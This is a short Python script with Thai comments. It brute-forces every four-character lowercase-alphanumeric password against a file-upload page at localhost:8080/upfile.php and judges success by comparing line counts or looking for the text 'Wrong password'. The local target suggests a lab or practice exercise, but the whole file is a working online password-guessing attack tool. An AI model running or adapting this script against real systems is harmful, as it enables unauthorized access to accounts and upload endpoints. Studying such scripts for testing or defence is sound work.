# import library ที่เกี่ยวข้อง
from urllib.request import Request, urlopen

# host
url = 'http://localhost:8080/upfile.php'

# ดึงข้อมูล tag html ที่แสดงบนเว็บนำมานับจำนวนบรรทัด
def getHTML():
    global html
    try:
        req = Request(url)
        html = len(urlopen(req).read().decode('utf-8').split('\n'))
    except:
        print('exception')

# ส่ง password มา post ตรวจสอบว่าใช่ password นี้ไหม
def sendPassword(password):
    # กำหนดข้อมูลที่จะ post
    post_data = '?action=do_upload&password=' + password
    link = url + post_data
    try:
        req = Request(link)
        txt_res = urlopen(req).read().decode('utf-8')
        res = len(txt_res.split('\n'))

        # ตรวจสอบจำนวนบรรทัดของหน้าปกติกับหน้าส่ง password ว่าเท่ากันไหม หรือข้อความหน้าส่ง password มีคำว่า 'Wrong password'
        if(res == html or txt_res.find('Wrong password') != -1):
            return False
        else:
            return True
    except:
        print('exception')

def createPass():
    # กำหนดขอบเขตของการค้นหา
    data = '1234567890abcdefghijklmnopqrstuvwxyz'
    # สร้าง password 4 ตัว
    for a in data:
        for b in data:
            for c in data:
                for d in data:
                    password = a + '' + b + '' + c + '' + d
                    # ถ้า password ถูกต้องให้หยุดการทำงาน
                    if(sendPassword(password)):
                        print(password + ' : YES')
                        return True
                    else:
                        print(password + ' : NO')

def test(password):
    if(sendPassword(password)):
        print('YES')
    else:
        print('NO')

getHTML()
createPass()

# ฟังก์ชันสำหรับทดสอบ
# test('')      # NO
# test('1234')  # YES